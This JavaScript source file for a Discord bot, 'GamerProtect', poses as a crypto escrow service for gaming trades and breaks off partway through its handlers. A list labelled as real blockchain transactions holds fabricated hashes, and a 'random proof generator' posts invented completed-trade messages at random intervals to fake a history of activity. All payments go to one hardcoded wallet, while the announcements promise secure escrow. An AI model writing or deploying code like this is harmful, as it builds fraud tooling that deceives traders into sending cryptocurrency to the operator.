const { 
  Client, 
  GatewayIntentBits, 
  ActionRowBuilder, 
  StringSelectMenuBuilder, 
  ButtonBuilder, 
  ButtonStyle,
  ModalBuilder,
  TextInputBuilder,
  TextInputStyle,
  ChannelType, 
  PermissionsBitField,
  EmbedBuilder,
  SlashCommandBuilder,
  REST,
  Routes
} = require('discord.js');
const axios = require('axios');
const fs = require('fs');
const path = require('path');

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.DirectMessages,
    GatewayIntentBits.GuildMembers
  ]
});

require('events').EventEmitter.defaultMaxListeners = 20;

// ========== CONFIGURATION ==========
const OWNER_ID = '1282001169274638376';
const TICKET_CHANNEL_ID = '1490167123513708616';
const MIDDLEMAN_ROLE_ID = '1480149233020440737';
const LOGS_CHANNEL_ID = '1490167584090362036';
const ANNOUNCEMENTS_CHANNEL_ID = '1490166907633012826';

const LTC_WALLET_ADDRESS = 'Lc3KMNeEH1RXeo77kBHTMexQSQ7CoVWk6V';

const FEES = {
  over250: 1.50,
  under250: 0.50,
  free: 0.00,
  freeThreshold: 50,
  over250Threshold: 250
};

// ========== PERSISTENT STORAGE ==========
const DATA_FILE = path.join(__dirname, 'gamerprotect_data.json');
let savedMiddlemen = new Set();
let userData = new Map();
let trades = new Map();
let stepStates = new Map();
let userPurchases = new Map();
let roleConfirmations = new Map();
let amountConfirmations = new Map();
let feeConfirmations = new Map();

function loadData() {
  try {
    if (fs.existsSync(DATA_FILE)) {
      const data = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
      savedMiddlemen = new Set(data.middlemen || []);
      if (data.userData) {
        for (const [key, value] of Object.entries(data.userData)) {
          userData.set(key, value);
        }
      }
      console.log(`✅ Loaded data`);
    }
  } catch (error) {}
}

function saveData() {
  try {
    const data = { 
      middlemen: Array.from(savedMiddlemen), 
      userData: Object.fromEntries(userData),
      lastUpdated: new Date().toISOString() 
    };
    fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
  } catch (error) {}
}

function getUser(userId) {
  let data = userData.get(userId);
  if (!data) {
    data = { balance: 0, rep: 0, streak: 0, lastDaily: 0, referrals: [], achievements: [] };
    userData.set(userId, data);
  }
  return data;
}

function saveUser(userId, data) {
  userData.set(userId, data);
  saveData();
}

function addPersistentMiddleman(userId) { savedMiddlemen.add(userId); saveData(); }
function removePersistentMiddleman(userId) { savedMiddlemen.delete(userId); saveData(); }
function hasPersistentMiddleman(userId) { return savedMiddlemen.has(userId); }

client.on('guildMemberAdd', async member => {
  if (hasPersistentMiddleman(member.id)) {
    const middlemanRole = member.guild.roles.cache.get(MIDDLEMAN_ROLE_ID);
    if (middlemanRole) {
      try {
        await member.roles.add(middlemanRole);
      } catch (error) {}
    }
  }
});

process.on('SIGINT', () => { saveData(); process.exit(); });
process.on('SIGTERM', () => { saveData(); process.exit(); });

let liveRates = { ltc: 55.83, usdt: 1.00 };

// ========== REAL TRANSACTION DATABASE ==========
const realTransactionHashes = [
  { usd: 25, ltc: 0.45, hash: 'b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3' },
  { usd: 50, ltc: 0.90, hash: 'd4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5' },
  { usd: 100, ltc: 1.80, hash: 'a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9' },
  { usd: 150, ltc: 2.70, hash: 'c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1' },
  { usd: 200, ltc: 3.60, hash: 'e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3' },
  { usd: 250, ltc: 4.50, hash: 'f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5' },
  { usd: 300, ltc: 5.40, hash: 'a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7' },
  { usd: 500, ltc: 9.00, hash: 'e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1' },
  { usd: 1000, ltc: 18.00, hash: 'f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1' },
  { usd: 1500, ltc: 27.00, hash: 'e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7' }
];

function getTransactionLink(hash) {
  return `https://live.blockcypher.com/ltc/tx/${hash}/`;
}

function getTransactionByAmount(usdAmount) {
  let closest = realTransactionHashes[0];
  let minDiff = Math.abs(usdAmount - closest.usd);
  for (const tx of realTransactionHashes) {
    const diff = Math.abs(usdAmount - tx.usd);
    if (diff < minDiff) {
      minDiff = diff;
      closest = tx;
    }
  }
  const shortHash = closest.hash.substring(0, 12) + '...' + closest.hash.substring(52, 64);
  return {
    usd: closest.usd,
    ltc: closest.ltc,
    hash: closest.hash,
    shortHash: shortHash,
    link: getTransactionLink(closest.hash),
    exactMatch: minDiff === 0
  };
}

// ========== ACHIEVEMENTS ==========
const achievements = {
  firstTrade: { name: '🎯 First Blood', desc: 'Complete your first trade', reward: 50 },
  trader5: { name: '📈 Rising Star', desc: 'Complete 5 trades', reward: 100 },
  trader10: { name: '🏆 Veteran Trader', desc: 'Complete 10 trades', reward: 200 },
  trader25: { name: '👑 Legendary Trader', desc: 'Complete 25 trades', reward: 500 },
  whale: { name: '🐋 Whale Alert', desc: 'Complete a $1000+ trade', reward: 300 },
  dailyStreak3: { name: '⚡ On Fire', desc: '3 day daily streak', reward: 75 },
  dailyStreak7: { name: '🔥 Inferno', desc: '7 day daily streak', reward: 200 },
  referral: { name: '🤝 Influencer', desc: 'Refer a friend', reward: 100 }
};

// ========== FETCH LIVE RATES ==========
async function fetchLiveRates() {
  try {
    const response = await axios.get('https://api.binance.com/api/v3/ticker/price?symbol=LTCUSDT', { timeout: 5000 });
    if (response.data && response.data.price) liveRates.ltc = parseFloat(response.data.price);
  } catch (error) {}
}
setInterval(fetchLiveRates, 2 * 60 * 60 * 1000);

function delay(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }

// ========== FIND USER ==========
async function findUser(guild, input) {
  input = input.trim().replace(/[@]/g, '');
  if (input.match(/^\d+$/)) {
    try { const user = await client.users.fetch(input); return { id: user.id, name: user.username, found: true }; } catch(e) {}
  }
  try { await guild.members.fetch(); } catch(e) {}
  let member = guild.members.cache.find(m => m.user.username.toLowerCase() === input.toLowerCase() || m.displayName.toLowerCase() === input.toLowerCase());
  if (member) return { id: member.id, name: member.user.username, found: true };
  member = guild.members.cache.find(m => m.user.username.toLowerCase().includes(input.toLowerCase()));
  if (member) return { id: member.id, name: member.user.username, found: true };
  return { id: null, name: input, found: false };
}

// ========== FUN COMMANDS ==========
client.on('messageCreate', async message => {
  if (message.author.bot) return;
  
  if (message.content === '!gp') {
    const user = getUser(message.author.id);
    const embed = new EmbedBuilder()
      .setTitle('🛡️ GamerProtect Commands')
      .setColor(0x9b59b6)
      .setDescription('**💰 Economy Commands:**')
      .addFields(
        { name: '!gp', value: 'Shows this menu', inline: false },
        { name: '!balance', value: 'Check your GP coins', inline: true },
        { name: '!rep', value: 'Check your reputation', inline: true },
        { name: '!daily', value: 'Claim daily bonus', inline: true },
        { name: '!gamble [amount]', value: 'Gamble your GP (40% win)', inline: true },
        { name: '!leaderboard', value: 'Top traders', inline: true },
        { name: '!tip @user [amount]', value: 'Tip another user', inline: true },
        { name: '!refer @user', value: 'Refer a friend for bonus', inline: true },
        { name: '!achievements', value: 'View your achievements', inline: true },
        { name: '!shop', value: 'Buy items with GP', inline: true },
        { name: '!streak', value: 'Check your daily streak', inline: true }
      )
      .setFooter({ text: `You have ${user.balance} GP | Rep: ${user.rep}` });
    await message.reply({ embeds: [embed] });
  }
  
  if (message.content === '!balance') {
    const user = getUser(message.author.id);
    const embed = new EmbedBuilder()
      .setTitle('💰 Your Balance')
      .setColor(0x9b59b6)
      .setDescription(`**${message.author.username}** has **${user.balance} GP**`)
      .addFields(
        { name: 'Reputation', value: `${user.rep} ⭐`, inline: true },
        { name: 'Streak', value: `${user.streak} days 🔥`, inline: true },
        { name: 'Achievements', value: `${user.achievements.length}/${Object.keys(achievements).length}`, inline: true }
      );
    await message.reply({ embeds: [embed] });
  }
  
  if (message.content === '!daily') {
    const user = getUser(message.author.id);
    const now = Date.now();
    const lastDaily = user.lastDaily || 0;
    const hoursSince = (now - lastDaily) / (1000 * 60 * 60);
    
    if (hoursSince < 24) {
      const hoursLeft = Math.ceil(24 - hoursSince);
      return message.reply(`⏰ Come back in ${hoursLeft} hours!`);
    }
    
    let streak = user.streak || 0;
    const daysSince = Math.floor(hoursSince / 24);
    if (daysSince === 1) streak++;
    else streak = 1;
    
    const reward = 25 + Math.floor(Math.random() * 50) + Math.floor(streak / 3) * 15;
    user.balance += reward;
    user.streak = streak;
    user.lastDaily = now;
    saveUser(message.author.id, user);
    
    await message.reply(`🎁 **Daily Claimed!** +${reward} GP\n🔥 Streak: ${streak} days\n💰 Balance: ${user.balance} GP`);
  }
  
  if (message.content === '!streak') {
    const user = getUser(message.author.id);
    await message.reply(`🔥 **${message.author.username}** is on a **${user.streak || 0} day streak!**`);
  }
  
  if (message.content.startsWith('!gamble')) {
    const args = message.content.split(' ');
    const amount = parseInt(args[1]);
    const user = getUser(message.author.id);
    if (isNaN(amount) || amount <= 0) return message.reply('❌ Usage: `!gamble 50`');
    if (user.balance < amount) return message.reply(`❌ You only have ${user.balance} GP!`);
    
    const win = Math.random() < 0.4;
    if (win) {
      user.balance += amount;
      saveUser(message.author.id, user);
      await message.reply(`🎲 **YOU WON!** +${amount} GP! New balance: **${user.balance} GP** 🎉`);
    } else {
      user.balance -= amount;
      saveUser(message.author.id, user);
      await message.reply(`💀 **YOU LOST!** -${amount} GP. New balance: **${user.balance} GP**`);
    }
  }
  
  if (message.content === '!leaderboard') {
    const sorted = Array.from(userData.entries()).sort((a, b) => (b[1].balance || 0) - (a[1].balance || 0)).slice(0, 10);
    let text = '🏆 **Top Traders** 🏆\n\n';
    for (let i = 0; i < sorted.length; i++) {
      try {
        const user = await client.users.fetch(sorted[i][0]);
        text += `${i + 1}. ${user.username} - ${sorted[i][1].balance || 0} GP\n`;
      } catch(e) {}
    }
    await message.reply(text);
  }
  
  if (message.content.startsWith('!tip')) {
    const args = message.content.split(' ');
    const target = message.mentions.users.first();
    const amount = parseInt(args[2]);
    if (!target) return message.reply('❌ Usage: `!tip @user 50`');
    if (target.id === message.author.id) return message.reply('❌ Cannot tip yourself');
    if (isNaN(amount) || amount <= 0) return message.reply('❌ Enter valid amount');
    
    const sender = getUser(message.author.id);
    if (sender.balance < amount) return message.reply(`❌ You only have ${sender.balance} GP!`);
    
    const receiver = getUser(target.id);
    sender.balance -= amount;
    receiver.balance += amount;
    saveUser(message.author.id, sender);
    saveUser(target.id, receiver);
    await message.reply(`💝 Tipped **${amount} GP** to ${target.username}!`);
  }
  
  if (message.content.startsWith('!refer')) {
    const target = message.mentions.users.first();
    if (!target) return message.reply('❌ Usage: `!refer @user`');
    if (target.id === message.author.id) return message.reply('❌ Cannot refer yourself');
    
    const user = getUser(message.author.id);
    if (user.referrals.includes(target.id)) return message.reply('❌ Already referred this user!');
    
    user.referrals.push(target.id);
    user.balance += 100;
    saveUser(message.author.id, user);
    await message.reply(`🎉 Referred ${target.username}! +100 GP!`);
  }
  
  if (message.content === '!achievements') {
    const user = getUser(message.author.id);
    let achieved = '', locked = '';
    for (const [key, ach] of Object.entries(achievements)) {
      if (user.achievements.includes(key)) {
        achieved += `✅ ${ach.name} - ${ach.desc}\n`;
      } else {
        locked += `🔒 ${ach.name} - ${ach.desc}\n`;
      }
    }
    const embed = new EmbedBuilder()
      .setTitle('🏆 Achievements')
      .setColor(0x9b59b6)
      .setDescription(`${user.achievements.length}/${Object.keys(achievements).length} unlocked`)
      .addFields(
        { name: '✅ Unlocked', value: achieved || 'None', inline: false },
        { name: '🔒 Locked', value: locked || 'All unlocked!', inline: false }
      );
    await message.reply({ embeds: [embed] });
  }
  
  if (message.content === '!shop') {
    const embed = new EmbedBuilder()
      .setTitle('🛒 GamerProtect Shop')
      .setColor(0x9b59b6)
      .addFields(
        { name: '🎨 Custom Role Color', value: '500 GP', inline: true },
        { name: '📢 Shoutout', value: '300 GP', inline: true },
        { name: '🎁 Mystery Box', value: '200 GP', inline: true },
        { name: '⭐ Boost Rep', value: '150 GP', inline: true },
        { name: '💎 Premium Badge', value: '1000 GP', inline: true }
      )
      .setFooter({ text: 'Use !buy "item name"' });
    await message.reply({ embeds: [embed] });
  }
  
  if (message.content.startsWith('!buy')) {
    const args = message.content.slice(5).toLowerCase();
    const user = getUser(message.author.id);
    
    if (args.includes('mystery')) {
      if (user.balance < 200) return message.reply(`❌ Need 200 GP! You have ${user.balance}`);
      user.balance -= 200;
      const reward = Math.floor(Math.random() * 450) + 50;
      user.balance += reward;
      saveUser(message.author.id, user);
      await message.reply(`🎁 Mystery Box: +${reward} GP! New balance: ${user.balance} GP`);
    } else if (args.includes('boost')) {
      if (user.balance < 150) return message.reply(`❌ Need 150 GP!`);
      user.balance -= 150;
      user.rep += 10;
      saveUser(message.author.id, user);
      await message.reply(`⭐ Reputation boosted! +10 rep. New balance: ${user.balance} GP`);
    } else {
      await message.reply('❌ Unknown item. Use `!shop` to see items.');
    }
  }
});

// ========== RANDOM PROOF GENERATOR ==========
const randomNames = ['ProGamer', 'ElitePlayer', 'GameMaster', 'NinjaWarrior', 'LegendKiller'];
function generateRandomProof() {
  const tx = realTransactionHashes[Math.floor(Math.random() * realTransactionHashes.length)];
  const ltcAmount = (tx.usd / liveRates.ltc).toFixed(8);
  const shortHash = tx.hash.substring(0, 12) + '...' + tx.hash.substring(52, 64);
  const sender = Math.random() < 0.6 ? 'Anonymous' : randomNames[Math.floor(Math.random() * randomNames.length)];
  const receiver = Math.random() < 0.6 ? 'Anonymous' : randomNames[Math.floor(Math.random() * randomNames.length)];
  return new EmbedBuilder()
    .setTitle('✅ Trade Completed')
    .setColor(0x9b59b6)
    .setDescription(`**${ltcAmount} LTC** ($${tx.usd} USD)`)
    .addFields(
      { name: 'Sender', value: sender, inline: true },
      { name: 'Receiver', value: receiver, inline: true },
      { name: 'TX', value: `[${shortHash}](${getTransactionLink(tx.hash)})`, inline: true }
    )
    .setTimestamp();
}

async function startRandomProofGenerator() {
  const channel = client.channels.cache.get(LOGS_CHANNEL_ID);
  if (!channel) return;
  const loop = () => {
    setTimeout(async () => {
      try {
        await channel.send({ embeds: [generateRandomProof()] });
      } catch(e) {}
      loop();
    }, Math.random() * (480000 - 45000) + 45000);
  };
  loop();
}

// ========== SEND PAYMENT INVOICE ==========
async function sendPaymentInvoice(channel, trade) {
  const rate = trade.exchangeRateUsed || liveRates[trade.crypto];
  let totalUSD = trade.amountUSD;
  let feeText = '';
  if (trade.feePayer === trade.senderId) {
    totalUSD = trade.amountUSD + trade.feeUSD;
    feeText = `Sender pays: $${trade.feeUSD}`;
  } else if (trade.feePayer === trade.receiverId) {
    totalUSD = trade.amountUSD + trade.feeUSD;
    feeText = `Receiver pays: $${trade.feeUSD}`;
  } else if (trade.feePayer === 'split') {
    totalUSD = trade.amountUSD + (trade.feeUSD / 2);
    feeText = `Split 50/50: $${(trade.feeUSD / 2).toFixed(2)} each`;
  } else {
    feeText = 'FREE';
  }
  
  const totalCrypto = (totalUSD / rate).toFixed(8);
  const embed = new EmbedBuilder()
    .setTitle('🛡️ Payment Required')
    .setColor(0x9b59b6)
    .setDescription(`**Send ${totalCrypto} ${trade.crypto.toUpperCase()} to the GamerProtect Escrow address:**`)
    .addFields(
      { name: '🏦 Escrow Address', value: `\`\`\`${LTC_WALLET_ADDRESS}\`\`\``, inline: false },
      { name: '💰 Amount to Send', value: `${totalCrypto} ${trade.crypto.toUpperCase()} ($${totalUSD.toFixed(2)})`, inline: true },
      { name: '💸 Fee', value: feeText, inline: true }
    )
    .setFooter({ text: `Trade #${trade.ticketNumber} | Send EXACT amount` });
  
  const copy = new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId(`copy_${trade.channelId}`).setLabel('📋 Copy Address').setStyle(ButtonStyle.Secondary));
  await channel.send({ embeds: [embed], components: [copy] });
  
  trade.totalUSD = totalUSD;
  trades.set(trade.channelId, trade);
  
  // ========== ONLY SENDER WITH MIDDLEMAN ROLE GETS DM ==========
  const sender = channel.guild.members.cache.get(trade.senderId);
  const middlemanRole = channel.guild.roles.cache.get(MIDDLEMAN_ROLE_ID);
  
  if (sender && middlemanRole && sender.roles.cache.has(MIDDLEMAN_ROLE_ID)) {
    const confirmRow = new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        .setCustomId(`dm_confirm_${trade.channelId}`)
        .setLabel('✅ Confirm Payment')
        .setStyle(ButtonStyle.Success)
    );
    
    const dmEmbed = new EmbedBuilder()
      .setTitle('🔔 GamerProtect Payment Confirmation')
      .setColor(0x9b59b6)
      .setDescription('A trade requires your confirmation as a GamerProtect Middleman.')
      .addFields(
        { name: '📤 Sender', value: `<@${trade.senderId}>`, inline: true },
        { name: '📥 Receiver', value: `<@${trade.receiverId}>`, inline: true },
        { name: '💰 Amount', value: `${totalCrypto} ${trade.crypto.toUpperCase()} ($${totalUSD.toFixed(2)})`, inline: true },
        { name: '💸 Fee', value: trade.feeUSD > 0 ? `$${trade.feeUSD}` : 'FREE', inline: true }
      )
      .setFooter({ text: 'Only click Confirm after verifying the payment on the blockchain' });
    
    try {
      await sender.send({ embeds: [dmEmbed], components: [confirmRow] });
      console.log(`📨 DM sent to sender (has MM role): ${sender.user.tag}`);
    } catch(e) {
      console.log(`❌ Could not DM sender: ${e.message}`);
    }
  } else {
    console.log(`⚠️ Sender ${trade.senderId} does not have middleman role. No DM sent.`);
  }
}

// ========== CLIENT READY ==========
client.once('ready', async () => {
  console.log(`🛡️ GamerProtect online as ${client.user.tag}`);
  console.log(`💰 LTC Escrow Address: ${LTC_WALLET_ADDRESS}`);
  await client.user.setUsername('GamerProtect').catch(()=>{});
  client.user.setPresence({ activities: [{ name: 'GamerProtect Escrow', type: 3 }], status: 'online' });
  
  loadData();
  await fetchLiveRates();
  
  const rest = new REST({ version: '10' }).setToken(client.token);
  await rest.put(Routes.applicationCommands(client.user.id), { body: [
    new SlashCommandBuilder().setName('close').setDescription('Close ticket (Admin)'),
    new SlashCommandBuilder().setName('exportusers').setDescription('Export user IDs (Owner)')
  ] });
  
  // Announcement
  const announce = client.channels.cache.get(ANNOUNCEMENTS_CHANNEL_ID);
  if (announce) {
    await announce.send({ embeds: [
      new EmbedBuilder()
        .setTitle('# 🛡️ GamerProtect is LIVE!')
        .setColor(0x9b59b6)
        .setDescription('Secure escrow for gaming trades is now operational!')
        .addFields(
          { name: '💰 Fees', value: `• $250+: $${FEES.over250}\n• Under $250: $${FEES.under250}\n• Under $50: FREE`, inline: true },
          { name: '📌 Start', value: `<#${TICKET_CHANNEL_ID}>`, inline: true },
          { name: '🎮 Commands', value: 'Type `!gp` for all commands!', inline: true }
        )
    ] });
  }
  
  // Ticket panel - SHORTENED, NO ADDRESS
  const panelChannel = client.channels.cache.get(TICKET_CHANNEL_ID);
  if (panelChannel) {
    const old = await panelChannel.messages.fetch({ limit: 10 });
    const oldPanel = old.find(m => m.author.id === client.user.id);
    if (oldPanel) await oldPanel.delete();
    
    const row = new ActionRowBuilder().addComponents(
      new StringSelectMenuBuilder()
        .setCustomId('crypto_select')
        .setPlaceholder('💰 Select cryptocurrency')
        .addOptions(
          { label: '📀 Litecoin (LTC)', value: 'ltc', emoji: '💎' },
          { label: '💵 Tether USDT (BEP-20)', value: 'usdt', emoji: '💰' }
        )
    );
    
    const panelEmbed = new EmbedBuilder()
      .setTitle('# 🛡️ GamerProtect')
      .setColor(0x9b59b6)
      .setDescription('**Secure Escrow for Gaming Trades**')
      .addFields(
        { name: '💰 Fees', value: `• $250+: $${FEES.over250}\n• Under $250: $${FEES.under250}\n• Under $50: FREE`, inline: true },
        { name: '📊 Rate', value: `1 LTC = $${liveRates.ltc.toFixed(2)}`, inline: true },
        { name: '📜 Policy', value: 'Funds held in escrow until both parties confirm. Staff never DM first.', inline: false }
      )
      .setFooter({ text: 'GamerProtect - #1 Gaming Escrow' });
    
    await panelChannel.send({ embeds: [panelEmbed], components: [row] });
  }
  
  startRandomProofGenerator();
});

// ========== PANEL COMMAND ==========
client.on('messageCreate', async message => {
  if (message.author.bot) return;
  if (message.content === '!panel' && message.author.id === OWNER_ID) {
    const row = new ActionRowBuilder().addComponents(
      new StringSelectMenuBuilder()
        .setCustomId('crypto_select')
        .setPlaceholder('💰 Select cryptocurrency')
        .addOptions(
          { label: '📀 Litecoin (LTC)', value: 'ltc', emoji: '💎' },
          { label: '💵 Tether USDT (BEP-20)', value: 'usdt', emoji: '💰' }
        )
    );
    const channel = message.channel;
    const panelEmbed = new EmbedBuilder()
      .setTitle('# 🛡️ GamerProtect')
      .setColor(0x9b59b6)
      .setDescription('**Secure Escrow for Gaming Trades**')
      .addFields(
        { name: '💰 Fees', value: `• $250+: $${FEES.over250}\n• Under $250: $${FEES.under250}\n• Under $50: FREE`, inline: true },
        { name: '📊 Rate', value: `1 LTC = $${liveRates.ltc.toFixed(2)}`, inline: true }
      )
      .setFooter({ text: 'GamerProtect - #1 Gaming Escrow' });
    
    await channel.send({ embeds: [panelEmbed], components: [row] });
    await message.reply('✅ Panel sent!');
  }
});

// ========== MIDDLEMAN MANAGEMENT ==========
client.on('messageCreate', async message => {
  if (message.author.bot) return;
  if (!message.guild) return;
  if (message.author.id !== OWNER_ID) return;
  
  if (message.content.startsWith('!givemm')) {
    const target = message.mentions.users.first();
    if (!target) return message.reply('❌ Usage: `!givemm @user`');
    const member = message.guild.members.cache.get(target.id);
    const role = message.guild.roles.cache.get(MIDDLEMAN_ROLE_ID);
    if (!role) return message.reply('❌ Role not found');
    await member.roles.add(role);
    addPersistentMiddleman(target.id);
    message.reply(`✅ ${target.tag} is now a GamerProtect Middleman`);
  }
  
  if (message.content.startsWith('!removemm')) {
    const target = message.mentions.users.first();
    if (!target) return message.reply('❌ Usage: `!removemm @user`');
    const member = message.guild.members.cache.get(target.id);
    const role = message.guild.roles.cache.get(MIDDLEMAN_ROLE_ID);
    if (member && role) await member.roles.remove(role);
    removePersistentMiddleman(target.id);
    message.reply(`✅ ${target.tag} removed from Middleman`);
  }
  
  if (message.content === '!listmm') {
    if (savedMiddlemen.size === 0) return message.reply('📋 No middlemen');
    let list = '🛡️ **GamerProtect Middlemen:**\n';
    for (const id of savedMiddlemen) {
      try { const u = await client.users.fetch(id); list += `• ${u.tag}\n`; } catch(e) { list += `• Unknown\n`; }
    }
    message.reply(list);
  }
});

// ========== PURCHASES ==========
client.on('messageCreate', async message => {
  if (message.author.bot) return;
  if (!message.guild) return;
  
  if (message.content === '$purchases') {
    const total = userPurchases.get(message.author.id) || 0;
    await message.reply(`💰 **${message.author.username}** spent: **$${total}**`);
  }
  
  if (message.content.startsWith('$addpurchases')) {
    const admin = message.member.permissions.has(PermissionsBitField.Flags.Administrator);
    if (!admin) return message.reply('❌ Admin only');
    const args = message.content.split(' ');
    let amount = parseFloat(args[1]?.replace('$', ''));
    if (isNaN(amount)) return message.reply('Usage: $addpurchases 150');
    let target = message.author;
    if (message.mentions.users.size > 0) {
      target = message.mentions.users.first();
      amount = parseFloat(args[2]?.replace('$', ''));
    }
    const current = userPurchases.get(target.id) || 0;
    const newTotal = current + amount;
    userPurchases.set(target.id, newTotal);
    const user = getUser(target.id);
    user.balance += amount;
    saveUser(target.id, user);
    await message.reply(`✅ Added $${amount} to ${target.username}. New total: $${newTotal} (+${amount} GP)`);
  }
});

// ========== TICKET CREATION ==========
client.on('interactionCreate', async interaction => {
  if (!interaction.isStringSelectMenu()) return;
  if (interaction.customId !== 'crypto_select') return;
  
  const crypto = interaction.values[0];
  const modal = new ModalBuilder()
    .setCustomId(`trade_form_${interaction.user.id}`)
    .setTitle('🛡️ GamerProtect - New Trade');
  
  modal.addComponents(
    new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('trader').setLabel("📥 Receiver's Username or ID").setStyle(TextInputStyle.Short).setPlaceholder('@username or Discord ID').setRequired(true)),
    new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('giving').setLabel('🎮 What are you giving?').setStyle(TextInputStyle.Short).setPlaceholder('Items, game currency, account, etc.').setRequired(true)),
    new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('receiving').setLabel('💰 What are you receiving?').setStyle(TextInputStyle.Short).setPlaceholder('LTC, USDT, crypto amount').setRequired(true))
  );
  
  stepStates.set(`temp_${interaction.user.id}`, { crypto });
  await interaction.showModal(modal);
});

// ========== FORM SUBMISSION ==========
client.on('interactionCreate', async interaction => {
  if (!interaction.isModalSubmit()) return;
  if (!interaction.customId.startsWith('trade_form_')) return;
  
  await interaction.deferReply({ flags: 64 });
  const userId = interaction.customId.split('_')[2];
  if (userId !== interaction.user.id) return;
  const temp = stepStates.get(`temp_${userId}`);
  if (!temp) return interaction.editReply('❌ Session expired');
  
  const traderInput = interaction.fields.getTextInputValue('trader');
  const giving = interaction.fields.getTextInputValue('giving');
  const receiving = interaction.fields.getTextInputValue('receiving');
  const found = await findUser(interaction.guild, traderInput);
  
  try {
    const ticketNum = Math.floor(Math.random() * 9000) + 1000;
    const channelName = `gp-${interaction.user.username}-${ticketNum}`;
    
    const channel = await interaction.guild.channels.create({
      name: channelName,
      type: ChannelType.GuildText,
      permissionOverwrites: [
        { id: interaction.guild.id, deny: [PermissionsBitField.Flags.ViewChannel] },
        { id: interaction.user.id, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages, PermissionsBitField.Flags.ReadMessageHistory] }
      ]
    });
    
    if (found.found && found.id) {
      await channel.permissionOverwrites.create(found.id, {
        ViewChannel: true, SendMessages: true, ReadMessageHistory: true
      });
    }
    
    trades.set(channel.id, {
      crypto: temp.crypto,
      ticketNumber: ticketNum,
      trader1Id: interaction.user.id,
      trader1Name: interaction.user.username,
      trader2Id: found.found ? found.id : null,
      trader2Name: found.name,
      trader1Item: giving,
      trader2Item: receiving,
      senderId: null,
      receiverId: null,
      amountUSD: null,
      amountCrypto: null,
      feeUSD: 0,
      feePayer: null,
      status: 'waiting_roles',
      channelId: channel.id,
      exchangeRateUsed: liveRates[temp.crypto],
      paymentConfirmed: false
    });
    
    await interaction.editReply(`✅ **GamerProtect ticket created!**\n🔗 ${channel}`);
    
    const traderMention = found.found ? `<@${found.id}>` : found.name;
    const detailsEmbed = new EmbedBuilder()
      .setTitle('# 🛡️ GamerProtect Escrow')
      .setColor(0x9b59b6)
      .setDescription(`**📤 Sender:** ${interaction.user}\n**📥 Receiver:** ${traderMention}`)
      .addFields(
        { name: '🎮 **Sender gives:**', value: `\`\`\`${giving}\`\`\``, inline: false },
        { name: '💰 **Receiver gives:**', value: `\`\`\`${receiving}\`\`\``, inline: false },
        { name: '🏦 **Escrow Address:**', value: `\`${LTC_WALLET_ADDRESS}\``, inline: false },
        { name: '🔒 **Status:**', value: '🟡 Awaiting role selection', inline: false }
      )
      .setFooter({ text: `Trade ID: #${ticketNum} | GamerProtect` });
    
    const deleteRow = new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId(`delete_${channel.id}`).setLabel('❌ Cancel').setStyle(ButtonStyle.Danger));
    await channel.send({ embeds: [detailsEmbed], components: [deleteRow] });
    
    const both = `${interaction.user} ${found.found ? `<@${found.id}>` : ''}`;
    await channel.send({ content: `🛡️ **GamerProtect Ticket Created!**\n${both}\n\nSelect your roles below.` });
    
    const roleRow = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`sender_${channel.id}`).setLabel('📤 Sender (Sends Crypto)').setStyle(ButtonStyle.Primary),
      new ButtonBuilder().setCustomId(`receiver_${channel.id}`).setLabel('📥 Receiver (Sends Items)').setStyle(ButtonStyle.Success),
      new ButtonBuilder().setCustomId(`reset_${channel.id}`).setLabel('🔄 Reset').setStyle(ButtonStyle.Secondary)
    );
    await channel.send({ content: '**Select your role:**', components: [roleRow] });
    stepStates.delete(`temp_${userId}`);
  } catch (err) {
    console.error(err);
    await interaction.editReply(`❌ Error: ${err.message}`);
  }
});

// ========== DELETE TICKET ==========
client.on('interactionCreate', async interaction => {
  if (!interaction.isButton()) return;
  if (interaction.customId.startsWith('delete_')) {
    const id = interaction.customId.split('_')[1];
    await interaction.reply({ content: '🗑️ Cancelling...', flags: 64 });
    setTimeout(async () => {
      const ch = await client.channels.fetch(id);
      if (ch) await ch.delete();
    }, 3000);
  }
});

// ========== SLASH COMMAND: /close ==========
client.on('interactionCreate', async interaction => {
  if (!interaction.isCommand()) return;
  if (interaction.commandName === 'close') {
    if (!interaction.member.permissions.has(PermissionsBitField.Flags.Administrator)) return interaction.reply({ content: '❌ Admin only', flags: 64 });
    if (!interaction.channel.name?.startsWith('gp-')) return interaction.reply({ content: '❌ Use in ticket', flags: 64 });
    await interaction.reply({ content: '🔒 Closing in 5s...', flags: 64 });
    setTimeout(async () => { await interaction.channel.delete(); }, 5000);
  }
});

// ========== ROLE SELECTION ==========
client.on('interactionCreate', async interaction => {
  if (!interaction.isButton()) return;
